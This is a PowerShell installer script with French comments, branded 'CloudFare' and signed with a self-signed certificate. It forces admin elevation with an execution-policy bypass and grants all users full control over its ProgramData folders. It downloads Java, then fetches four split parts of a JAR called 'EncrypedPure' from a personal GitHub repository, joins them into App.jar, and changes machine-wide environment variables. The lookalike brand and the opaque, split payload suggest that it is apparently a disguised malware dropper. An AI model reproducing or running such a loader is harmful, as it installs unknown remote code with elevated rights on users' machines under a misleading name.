# CloudFare Installation Universal v1.0
# Compatible: Windows 10/11, Admin et User, 32/64-bit
# Gere les permissions automatiquement

param(
    [string]$InstallDir = "C:\ProgramData\CloudFare",
    [switch]$ForceAdmin = $false
)

$ErrorActionPreference = "Continue"

# ============================================================================
# FONCTIONS UTILITAIRES
# ============================================================================

function Write-Log {
    param([string]$Message, [string]$Type = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $color = @{
        "INFO" = "Cyan"
        "OK" = "Green"
        "WARN" = "Yellow"
        "ERROR" = "Red"
    }
    Write-Host "[$timestamp] [$Type] $Message" -F $color[$Type]
}

function Test-AdminPrivileges {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Request-AdminPrivileges {
    Write-Log "Privileges admin requis" "WARN"
    Write-Log "Relancement avec privileges elevees..." "INFO"
    
    $scriptPath = $MyInvocation.ScriptName
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    
    Start-Process powershell -ArgumentList $arguments -Verb RunAs -Wait
    exit 0
}

function Get-OSArchitecture {
    if ([Environment]::Is64BitOperatingSystem) {
        return "64-bit"
    } else {
        return "32-bit"
    }
}

function Get-WindowsVersion {
    $os = Get-WmiObject -Class Win32_OperatingSystem
    return $os.Caption
}

function Test-InternetConnection {
    try {
        $response = Invoke-WebRequest -Uri "https://github.com" -Method Head -UseBasicParsing -TimeoutSec 5
        return $true
    } catch {
        return $false
    }
}

function Create-DirectoryWithPermissions {
    param([string]$Path)
    
    try {
        if (-not (Test-Path $Path)) {
            New-Item -ItemType Directory -Path $Path -Force | Out-Null
            Write-Log "Dossier cree: $Path" "OK"
        }
        
        # Definir les permissions pour tous les utilisateurs
        $acl = Get-Acl $Path
        $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
            "Users",
            "FullControl",
            "ContainerInherit,ObjectInherit",
            "None",
            "Allow"
        )
        $acl.SetAccessRule($rule)
        Set-Acl -Path $Path -AclObject $acl
        
        return $true
    } catch {
        Write-Log "Erreur creation dossier: $_" "ERROR"
        return $false
    }
}

function Download-File {
    param(
        [string]$Url,
        [string]$OutputPath,
        [int]$MaxRetries = 3
    )
    
    $retryCount = 0
    while ($retryCount -lt $MaxRetries) {
        try {
            Write-Log "Telechargement: $(Split-Path $OutputPath -Leaf)" "INFO"
            (New-Object Net.WebClient).DownloadFile($Url, $OutputPath)
            
            if (Test-Path $OutputPath) {
                $size = [math]::Round((Get-Item $OutputPath).Length / 1MB, 2)
                Write-Log "OK - Telecharge ($size MB)" "OK"
                return $true
            }
        } catch {
            $retryCount++
            if ($retryCount -lt $MaxRetries) {
                Write-Log "Tentative $retryCount/$MaxRetries echouee, nouvelle tentative..." "WARN"
                Start-Sleep -Seconds 2
            }
        }
    }
    
    Write-Log "Erreur telechargement apres $MaxRetries tentatives" "ERROR"
    return $false
}

function Download-JavaPortable {
    param([string]$JavaDir)
    
    Write-Log "Telechargement Java 21..." "INFO"
    
    $javaUrl = "https://github.com/graalvm/graalvm-ce-builds/releases/download/jdk-21.0.1/graalvm-community-openjdk-21.0.1+12.1_windows-x64_bin.zip"
    $javaZip = "$env:TEMP\java21.zip"
    
    if (-not (Download-File -Url $javaUrl -OutputPath $javaZip)) {
        return $false
    }
    
    Write-Log "Extraction Java..." "INFO"
    try {
        Expand-Archive -Path $javaZip -DestinationPath "$JavaDir\.." -Force
        
        # Reorganiser les fichiers
        $extracted = Get-ChildItem "$JavaDir\.." -Filter "graalvm-*" -Directory | Select-Object -First 1
        if ($extracted) {
            Move-Item "$($extracted.FullName)\*" "$JavaDir\" -Force
            Remove-Item $extracted.FullName -Force
        }
        
        Remove-Item $javaZip -Force
        Write-Log "Java installe avec succes" "OK"
        return $true
    } catch {
        Write-Log "Erreur extraction Java: $_" "ERROR"
        return $false
    }
}

function Download-JarParts {
    param([string]$TempDir)
    
    Write-Log "Telechargement des 4 JAR parts..." "INFO"
    
    $baseUrl = "https://raw.githubusercontent.com/davidrenand/repos/main/jar"
    $parts = @(1, 2, 3, 4)
    $allOk = $true
    
    foreach ($part in $parts) {
        $partUrl = "$baseUrl/EncrypedPure.part$part.jar"
        $partFile = "$TempDir\EncrypedPure.part$part.jar"
        
        if (-not (Download-File -Url $partUrl -OutputPath $partFile)) {
            $allOk = $false
        }
    }
    
    return $allOk
}

function Assemble-Jar {
    param(
        [string]$TempDir,
        [string]$OutputJar
    )
    
    Write-Log "Assemblage du JAR..." "INFO"
    
    try {
        $output = [System.IO.File]::Create($OutputJar)
        
        for ($i = 1; $i -le 4; $i++) {
            $partFile = "$TempDir\EncrypedPure.part$i.jar"
            if (Test-Path $partFile) {
                $input = [System.IO.File]::OpenRead($partFile)
                $input.CopyTo($output)
                $input.Close()
                Write-Log "  Part $i assemblée" "OK"
            }
        }
        
        $output.Close()
        
        $size = [math]::Round((Get-Item $OutputJar).Length / 1MB, 2)
        Write-Log "JAR assemble: $size MB" "OK"
        return $true
    } catch {
        Write-Log "Erreur assemblage: $_" "ERROR"
        return $false
    }
}

function Set-EnvironmentVariables {
    param([string]$JavaDir)
    
    Write-Log "Configuration variables d'environnement..." "INFO"
    
    try {
        $currentPath = [Environment]::GetEnvironmentVariable("PATH", [System.EnvironmentVariableTarget]::Machine)
        $javaPath = "$JavaDir\bin"
        
        if ($currentPath -notlike "*$javaPath*") {
            $newPath = "$javaPath;$currentPath"
            [Environment]::SetEnvironmentVariable(
                "PATH",
                $newPath,
                [System.EnvironmentVariableTarget]::Machine
            )
            Write-Log "PATH mise a jour" "OK"
        }
        
        [Environment]::SetEnvironmentVariable(
            "JAVA_HOME",
            $JavaDir,
            [System.EnvironmentVariableTarget]::Machine
        )
        Write-Log "JAVA_HOME defini" "OK"
        
        return $true
    } catch {
        Write-Log "Avertissement: Impossible configurer variables env" "WARN"
        return $false
    }
}

function Verify-Installation {
    param(
        [string]$JavaDir,
        [string]$JarFile
    )
    
    Write-Log "Verification de l'installation..." "INFO"
    
    $javaExe = "$JavaDir\bin\java.exe"
    
    if (-not (Test-Path $javaExe)) {
        Write-Log "Java.exe non trouve" "ERROR"
        return $false
    }
    
    if (-not (Test-Path $JarFile)) {
        Write-Log "JAR non trouve" "ERROR"
        return $false
    }
    
    try {
        $version = & $javaExe -version 2>&1 | Select-Object -First 1
        Write-Log "Java: $version" "OK"
        
        $size = [math]::Round((Get-Item $JarFile).Length / 1MB, 2)
        Write-Log "JAR: $size MB" "OK"
        
        return $true
    } catch {
        Write-Log "Erreur verification: $_" "ERROR"
        return $false
    }
}

# ============================================================================
# EXECUTION PRINCIPALE
# ============================================================================

function Main {
    Write-Host ""
    Write-Host "CloudFare Installation Universal v1.0" -F Cyan
    Write-Host ""
    
    # Verifier les privileges
    if (-not (Test-AdminPrivileges)) {
        Write-Log "Privileges admin requis pour l'installation" "WARN"
        Request-AdminPrivileges
    }
    
    # Afficher les infos systeme
    Write-Log "Systeme: $(Get-WindowsVersion)" "INFO"
    Write-Log "Architecture: $(Get-OSArchitecture)" "INFO"
    
    # Verifier la connexion internet
    if (-not (Test-InternetConnection)) {
        Write-Log "Pas de connexion internet" "ERROR"
        exit 1
    }
    
    Write-Log "Connexion internet OK" "OK"
    
    # Creer les dossiers
    $javaDir = "$InstallDir\Java"
    $tempDir = "$InstallDir\Temp"
    $logsDir = "$InstallDir\Logs"
    
    if (-not (Create-DirectoryWithPermissions -Path $InstallDir)) { exit 1 }
    if (-not (Create-DirectoryWithPermissions -Path $javaDir)) { exit 1 }
    if (-not (Create-DirectoryWithPermissions -Path $tempDir)) { exit 1 }
    if (-not (Create-DirectoryWithPermissions -Path $logsDir)) { exit 1 }
    
    # Telecharger Java
    if (-not (Download-JavaPortable -JavaDir $javaDir)) { exit 1 }
    
    # Telecharger JAR parts
    if (-not (Download-JarParts -TempDir $tempDir)) { exit 1 }
    
    # Assembler JAR
    $jarFile = "$InstallDir\App.jar"
    if (-not (Assemble-Jar -TempDir $tempDir -OutputJar $jarFile)) { exit 1 }
    
    # Configurer variables d'environnement
    Set-EnvironmentVariables -JavaDir $javaDir
    
    # Verifier l'installation
    if (-not (Verify-Installation -JavaDir $javaDir -JarFile $jarFile)) { exit 1 }
    
    # Nettoyer les fichiers temporaires
    Write-Log "Nettoyage des fichiers temporaires..." "INFO"
    Remove-Item "$tempDir\*" -Force -ErrorAction SilentlyContinue
    
    Write-Host ""
    Write-Host "Installation terminee avec succes" -F Green
    Write-Host ""
    Write-Log "Dossier d'installation: $InstallDir" "INFO"
    Write-Log "Java: $javaDir" "INFO"
    Write-Log "Application: $jarFile" "INFO"
    Write-Host ""
    
    return 0
}

# Lancer
exit (Main)

# SIG # Begin signature block
# MIIFWwYJKoZIhvcNAQcCoIIFTDCCBUgCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUiyRnf1ImqC0QrbHyb/t0bnMb
# 0aOgggL8MIIC+DCCAeCgAwIBAgIQFEA8i6m7gZ5GA+AtSKCeIjANBgkqhkiG9w0B
# AQsFADAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwHhcNMjUxMTI3MTY0NjI1WhcNMzAx
# MTI3MTY1NjI1WjAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwggEiMA0GCSqGSIb3DQEB
# AQUAA4IBDwAwggEKAoIBAQCwcOS5Unea33JuYXDoorRS8MRt7/sCwNRSDcdRUz7N
# fb1NjESMXbkE/rLcapbH8DhYfpX59h0Cp0ROdfgcQSxitCOqn5zGIOThKOHUW18x
# wJnOBM1lRrvZfoNun1cSgYnE1BQX+2FlrCjeHRUCkYo/KuCYlHjSD7W4BWwPGXPJ
# ofCbFhX909qbXblZt6jJBoTni8MNC+Bizfv302qhVAh+0CWCCsYYhcNAWXj+qb0t
# 9EvQHGQT6c2weIanGEcIMDwjO0/sldunBEVJBhe8TXeF/3wfn1rGAzqOgvYXFvd/
# J9eeO/Oeo+BDNBRwPcVHmO02vK7RCUJqR3Ub7pBNVbBpAgMBAAGjRjBEMA4GA1Ud
# DwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQU4eXXKcu5
# 5PGlisHTXHU95ihdYyMwDQYJKoZIhvcNAQELBQADggEBAHRZGGdVylXjYignpkSf
# 5ctiETsIscLuQTJJ1URT67Y+0x7xbcD9474OCUuTIEZh9wPL2HSmoNrDY7qxMKc4
# qCwxwoWQAWmLLcxgytJ8qpi2vZaExBDgODwU3LIA3uNu3iCmHbu8ISF68T1HR2+c
# 7cn1wn/C3XZOVhOW8CVjIpltD01LujsoauH8eRg93R6q3Z5yJ+5WJDNYzl6Y2xGL
# 9UQ4Xv7y8+wXES809v5+e/2kQL/NWwd3hOB6/176mfaT15ZZHBys1pYOJBHiMO9v
# W5IImNwQ/eXXzUrppVnCQ6fLm5GyTKqGq14cMahma6K8r9lrgvkLI1VS1ue0La5l
# 5MAxggHJMIIBxQIBATAoMBQxEjAQBgNVBAMMCUNsb3VkRmFyZQIQFEA8i6m7gZ5G
# A+AtSKCeIjAJBgUrDgMCGgUAoHgwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZ
# BgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYB
# BAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQUG+TxSXeE8dYkRZZu9sKXZrPEirUwDQYJ
# KoZIhvcNAQEBBQAEggEAW1R5ADAEyJTFGsCRFYHTL1k8ln49+Beo7xSHMvcuHCtG
# HNyXVNkLRioBkfmD1XRXooV3IPk+AfT5bitX8Wlc1IWpHL+UpJwyCPlYAIucLw/0
# /0McVSzO34bEsYEE6O7yQTeIhfIIstGuYqawoF+lBlKh7z8LPEPnuPYekf1T/eGr
# GZUlt/eaFn3DkP+maPgrW6U+tLaC/fBs6iqei9R5p8K1vslPqFkr7yx1e+rnH3gf
# CcoJpH++0zzo1V+q4nsYQExJD5ADcaU6yVTAhnCUp4HxqTCj2bPomTqbMtlv16Hn
# HfTjvCH7V8rtKGP3kHMh+erwGNmQYs9NzYOVzbP5hg==
# SIG # End signature block
